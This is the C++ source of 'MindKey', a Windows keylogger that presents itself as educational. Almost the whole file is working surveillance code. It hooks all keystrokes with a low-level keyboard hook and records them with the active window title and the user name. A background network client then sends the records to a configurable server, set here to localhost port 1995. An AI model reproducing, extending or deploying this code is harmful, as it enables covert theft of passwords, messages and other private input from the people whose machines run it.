/* MindKey, Keylogger for Windows. 
 * While this program can potentially be used for nefarious purposes, 
 * it was written for educational and recreational purposes only
 * and the author does not endorse illegal use.
 *
 * Copyright (C) 2013 Blackhack <https://github.com/blackhack/MindKey/>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */


/* Ugly Windows API code */


#include "senderDaemon.h"
#include <stdio.h>
#include <fcntl.h>
#include <io.h>

//#define DEBUG

#define SERVER_ADDRESS "localhost"
#define SERVER_PORT "1995"
#define OUTFILE_NAME "MindKey.txt"

HHOOK kbdhook;
bool running;

Client* client = NULL;

__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
{
    if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN))
    {
        static bool capslock = false;
        static bool shift = false;
        char tmp[0xFF] = {0};
        std::string str;
        DWORD msg = 1;
        KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
        bool printable;

        msg += (st_hook.scanCode << 16);
        msg += (st_hook.flags << 24);
        GetKeyNameText(msg, tmp, 0xFF);
        str = std::string(tmp);

        printable = (str.length() <= 1) ? true : false;

        if (!printable)
        {
            if (str == "CAPSLOCK" || str == "BLOQ MAYUS")
                capslock = !capslock;
            else if (str == "SHIFT" || str == "MAYUSCULAS")
                shift = true;

            str = ("[" + str + "]");
        }

        if (printable)
        {
            if (shift == capslock)
            { /* Lowercase */
                for (size_t i = 0; i < str.length(); ++i)
                    str[i] = tolower(str[i]);
            }
            else
            { /* Uppercase */
                for (size_t i = 0; i < str.length(); ++i)
                {
                    if (str[i] >= 'A' && str[i] <= 'Z')
                        str[i] = toupper(str[i]);
                }
            }

            shift = false;
        }


        HWND fgwindow = GetForegroundWindow();
        char window_title[256];
        if (fgwindow)
            GetWindowText(fgwindow, window_title, 256);

        char username[0xFF];
        DWORD len = 0xFF;
        GetUserName(username, &len);


        // Create the data to be sent to server.
        KeyDataStruct keyData;
        keyData.User = username;
        keyData.WindowTitle = window_title;
        keyData.Key = str;
        client->AddKeyInfo(keyData);

#ifdef DEBUG
        std::cout << "Size: " << client->GetSizeBuffer() << "\n";
        std::string path = OUTFILE_NAME;
        std::ofstream outfile(path.c_str(), std::ios_base::app);
        outfile << str;
        outfile.close();
#endif
    }

    return CallNextHookEx(kbdhook, code, wp, lp);
}

#ifdef DEBUG

static const WORD MAX_CONSOLE_LINES = 500;

void RedirectIOToConsole()
{
    int hConHandle;
    long lStdHandle;
    CONSOLE_SCREEN_BUFFER_INFO coninfo;
    FILE *fp;

    // allocate a console for this app
    AllocConsole();

    // set the screen buffer to be big enough to let us scroll text
    GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &coninfo);

    coninfo.dwSize.Y = MAX_CONSOLE_LINES;

    SetConsoleScreenBufferSize(GetStdHandle(STD_OUTPUT_HANDLE), coninfo.dwSize);

    // redirect unbuffered STDOUT to the console
    lStdHandle = (long)GetStdHandle(STD_OUTPUT_HANDLE);
    hConHandle = _open_osfhandle(lStdHandle, _O_TEXT);

    fp = _fdopen( hConHandle, "w" );
    *stdout = *fp;
    setvbuf(stdout, NULL, _IONBF, 0);

    // redirect unbuffered STDIN to the console
    lStdHandle = (long)GetStdHandle(STD_INPUT_HANDLE);
    hConHandle = _open_osfhandle(lStdHandle, _O_TEXT);

    fp = _fdopen(hConHandle, "r");
    *stdin = *fp;
    setvbuf(stdin, NULL, _IONBF, 0);

    // redirect unbuffered STDERR to the console
    lStdHandle = (long)GetStdHandle(STD_ERROR_HANDLE);
    hConHandle = _open_osfhandle(lStdHandle, _O_TEXT);

    fp = _fdopen(hConHandle, "w");
    *stderr = *fp;
    setvbuf(stderr, NULL, _IONBF, 0);

    // make cout, wcout, cin, wcin, wcerr, cerr, wclog and clog
    // point to console as well
    std::ios::sync_with_stdio();
}
#endif

void ServerRunThread(boost::asio::io_service* io_service, Client* clt)
{
    try
    {
        clt->StartSendOperations();
        io_service->run();
    }
    catch (std::exception& e)
    {
        std::cerr << e.what() << std::endl;
        exit(1);
    }
}

int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance, LPSTR cmdline, int ncmdshow)
{
    HWND fgwindow = GetForegroundWindow();
    MSG msg;
    HINSTANCE modulehandle;

#ifdef DEBUG
    RedirectIOToConsole();
#endif

    SetForegroundWindow(fgwindow);

    modulehandle = GetModuleHandle(NULL);
    kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);

    boost::asio::io_service io_service;
    client = new Client(io_service, SERVER_ADDRESS, SERVER_PORT);

    boost::thread senderThread(&ServerRunThread, &io_service, client);

    running = true;
    while (running)
    {
        if (!GetMessage(&msg, NULL, 0, 0))
            running = false; 

        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
